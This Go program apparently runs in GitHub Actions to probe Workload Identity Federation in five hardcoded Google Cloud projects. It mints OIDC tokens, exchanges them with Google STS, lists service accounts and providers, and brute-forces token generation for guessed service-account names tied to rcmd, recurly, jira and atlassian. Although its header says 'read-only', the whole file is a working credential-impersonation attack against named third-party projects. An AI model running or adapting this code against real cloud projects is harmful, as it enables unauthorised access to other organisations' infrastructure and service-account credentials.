package main

// Intent 42239: continue WIF usable-principal determination for new GCP projects.
// READ-ONLY against target; no writes. Mints genuine GitHub OIDC tokens (aud=provider
// resource name) for configured WIF providers, does STS exchange, then tries to
// (a) resolve project ID via cloudresourcemanager, (b) list service accounts,
// (c) impersonate common CI/deploy SAs.

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"
)

var client = &http.Client{Timeout: 45 * time.Second}

type proj struct {
	num       string
	providers []string // candidate provider resource names to try
}

var projects = []proj{
	{"507686559040", []string{
		"//iam.googleapis.com/projects/507686559040/locations/global/workloadIdentityPools/github-actions/providers/gh-provider",
	}},
	{"202458047894", []string{
		"//iam.googleapis.com/projects/202458047894/locations/global/workloadIdentityPools/github-actions/providers/gh-provider",
	}},
	{"434644661130", []string{
		"//iam.googleapis.com/projects/434644661130/locations/global/workloadIdentityPools/github-actions/providers/github",
	}},
	{"369001918367", []string{
		"//iam.googleapis.com/projects/369001918367/locations/global/workloadIdentityPools/github-actions/providers/gh-provider",
	}},
	{"597679076120", []string{
		"//iam.googleapis.com/projects/597679076120/locations/global/workloadIdentityPools/github-actions/providers/gh-provider",
	}},
}

// guessed project IDs to build github-actions@<id> SA names
var idGuesses = []string{
	"rcmd-staging", "rcmd-qa", "rcmd-operator", "rcmd-operator-staging", "rcmd-operator-qa",
	"recurly-rcmd", "recurly-rcmd-staging", "recurly-rcmd-qa", "rcmd", "atlassian", "jira",
	"recurly-ci-ops", "ci-ops", "recurly-atlassian", "recurly-jira",
}

var genericSANames = []string{
	"github-actions", "cloudbuild", "deploy", "terraform", "ci", "cicd",
	"deployer", "build", "runner", "gcs-sync", "service", "automation",
}

func httpDo(method, u, bearer string, body []byte) (int, string) {
	var rdr io.Reader
	if body != nil {
		rdr = bytes.NewReader(body)
	}
	req, err := http.NewRequest(method, u, rdr)
	if err != nil {
		return 0, "req-err:" + err.Error()
	}
	if bearer != "" {
		req.Header.Set("Authorization", "Bearer "+bearer)
	}
	if body != nil {
		req.Header.Set("Content-Type", "application/json")
	}
	resp, err := client.Do(req)
	if err != nil {
		return 0, "do-error:" + err.Error()
	}
	defer resp.Body.Close()
	b, _ := io.ReadAll(resp.Body)
	return resp.StatusCode, string(b)
}

func trim(s string, n int) string {
	s = strings.ReplaceAll(s, "\n", " ")
	s = strings.ReplaceAll(s, "  ", " ")
	if len(s) > n {
		return s[:n]
	}
	return s
}

func mintJWT(aud string) (string, string) {
	reqURL := os.Getenv("ACTIONS_ID_TOKEN_REQUEST_URL")
	reqTok := os.Getenv("ACTIONS_ID_TOKEN_REQUEST_TOKEN")
	if reqURL == "" {
		return "", "no ACTIONS_ID_TOKEN_REQUEST_URL"
	}
	u := reqURL + "&audience=" + url.QueryEscape(aud)
	req, _ := http.NewRequest("GET", u, nil)
	req.Header.Set("Authorization", "bearer "+reqTok)
	req.Header.Set("Accept", "application/json")
	resp, err := client.Do(req)
	if err != nil {
		return "", "oidc-err:" + err.Error()
	}
	defer resp.Body.Close()
	b, _ := io.ReadAll(resp.Body)
	var o struct {
		Value string `json:"value"`
	}
	json.Unmarshal(b, &o)
	return o.Value, string(b)
}

func stsExchange(aud, jwt string) (int, string, string) {
	body, _ := json.Marshal(map[string]string{
		"audience":           aud,
		"grantType":          "urn:ietf:params:oauth:grant-type:token-exchange",
		"requestedTokenType": "urn:ietf:params:oauth:token-type:access_token",
		"scope":              "https://www.googleapis.com/auth/cloud-platform",
		"subjectTokenType":   "urn:ietf:params:oauth:token-type:jwt",
		"subjectToken":       jwt,
	})
	st, sb := httpDo("POST", "https://sts.googleapis.com/v1/token", "", body)
	var tok struct {
		AccessToken string `json:"access_token"`
	}
	json.Unmarshal([]byte(sb), &tok)
	return st, sb, tok.AccessToken
}

func genAT(ft, email string) (int, string) {
	u := "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/" + url.PathEscape(email) + ":generateAccessToken"
	bd, _ := json.Marshal(map[string]interface{}{
		"scope":    []string{"https://www.googleapis.com/auth/cloud-platform"},
		"lifetime": "300s",
	})
	return httpDo("POST", u, ft, bd)
}

func main() {
	fmt.Println("=== INTENT42239 WIF PROBE V2 START ===")
	for _, p := range projects {
		num := p.num
		fmt.Println("###### PROJECT", num)
		// (a) resolve project id + metadata with a federated token
		var ft string
		for _, aud := range p.providers {
			jwt, raw := mintJWT(aud)
			if jwt == "" {
				fmt.Println("  MINT_FAIL:", trim(raw, 160))
				continue
			}
			st, sb, t := stsExchange(aud, jwt)
			fmt.Printf("  STS[%s] = %d %s\n", aud, st, trim(sb, 200))
			if t != "" {
				ft = t
				fmt.Println("  FEDERATED_TOKEN len=", len(t))
				break
			}
		}
		if ft == "" {
			continue
		}
		// project metadata
		{
			st, sb := httpDo("GET", "https://cloudresourcemanager.googleapis.com/v1/projects/"+num, ft, nil)
			fmt.Printf("  CRM.projects.get[%s] = %d %s\n", num, st, trim(sb, 400))
			st, sb = httpDo("GET", "https://cloudresourcemanager.googleapis.com/v3/projects/"+num, ft, nil)
			fmt.Printf("  CRM.v3.projects.get[%s] = %d %s\n", num, st, trim(sb, 400))
		}
		// (b) list service accounts
		{
			st, sb := httpDo("GET", "https://iam.googleapis.com/v1/projects/"+num+"/serviceAccounts", ft, nil)
			fmt.Printf("  IAM.listSA[%s] = %d %s\n", num, st, trim(sb, 900))
		}
		// (b2) list WIF pools/providers (to learn attribute conditions)
		{
			st, sb := httpDo("GET", "https://iam.googleapis.com/v1/projects/"+num+"/locations/global/workloadIdentityPools/github-actions/providers", ft, nil)
			fmt.Printf("  IAM.listProviders[%s] = %d %s\n", num, st, trim(sb, 700))
		}
		// (c) impersonate common SA names
		for _, id := range idGuesses {
			e := "github-actions@" + id + ".iam.gserviceaccount.com"
			st, sb := genAT(ft, e)
			if st != 404 {
				fmt.Printf("  GENAT[%s] = %d %s\n", e, st, trim(sb, 160))
			}
		}
		for _, n := range genericSANames {
			if n == "cloudbuild" || n == "deploy" || n == "terraform" {
				continue // already tested with project-id guesses
			}
			for _, id := range []string{"rcmd-staging", "rcmd-qa", "rcmd-operator", "jira", "atlassian"} {
				e := n + "@" + id + ".iam.gserviceaccount.com"
				st, sb := genAT(ft, e)
				if st != 404 {
					fmt.Printf("  GENAT[%s] = %d %s\n", e, st, trim(sb, 160))
				}
			}
		}
		// standard number-derived SAs (control, exists per v1)
		for _, e := range []string{
			num + "@cloudbuild.gserviceaccount.com",
			num + "-compute@developer.gserviceaccount.com",
			"service-" + num + "@cloudservices.gserviceaccount.com",
			"service-" + num + "@compute-system.gserviceaccount.com",
			"service-" + num + "@containerregistry.gserviceaccount.com",
			"service-" + num + "@cloudbuild.gserviceaccount.com",
		} {
			st, sb := genAT(ft, e)
			fmt.Printf("  GENAT[%s] = %d %s\n", e, st, trim(sb, 160))
		}
	}
	fmt.Println("=== INTENT42239 WIF PROBE V2 END ===")
}
